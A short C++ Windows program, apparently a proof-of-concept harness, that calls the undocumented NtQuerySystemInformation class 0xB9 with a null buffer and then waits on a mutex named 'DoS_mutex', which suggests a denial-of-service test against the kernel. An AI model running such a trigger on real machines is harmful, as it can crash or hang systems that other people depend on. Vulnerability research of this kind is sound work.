#include "stdafx.h"

#include <windows.h>
#include <iostream>

#define MAXIMUM_FILENAME_LENGTH 255 

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__int64 SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

#define ARG_CODE 0xB9

int main()
{
	HMODULE ntdll_handle = GetModuleHandle(L"ntdll");

	if (ntdll_handle == NULL) {
		std::cout << "Error: GetModuleHandle ntdll";
		return 1;
	}

	PNtQuerySystemInformation NtQuerySystemInformation = \
	(PNtQuerySystemInformation)GetProcAddress(ntdll_handle, "NtQuerySystemInformation");

	if (NtQuerySystemInformation == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}

	ULONG len = 0;
	//DebugBreak();
	NTSTATUS status = NtQuerySystemInformation(ARG_CODE, 0, 0, &len);

	//std::cout << "started" << std::endl;

	HANDLE mutex = OpenMutexA(SYNCHRONIZE, false, "DoS_mutex");
	if (mutex == NULL) {
		std::cout << "Can't obtain mutex: " << GetLastError() << std::endl;
		exit(1);
	}

	WaitForSingleObject(mutex, INFINITE);
	std::cout << "Mutex is in signaled state!" << std::endl;
	CloseHandle(mutex);
	//while (true) {

	//}

	//DebugBreak();
	//if (status != (NTSTATUS)0x0) {
	//	printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
	//	return 1;
	//}
    return 0;
}

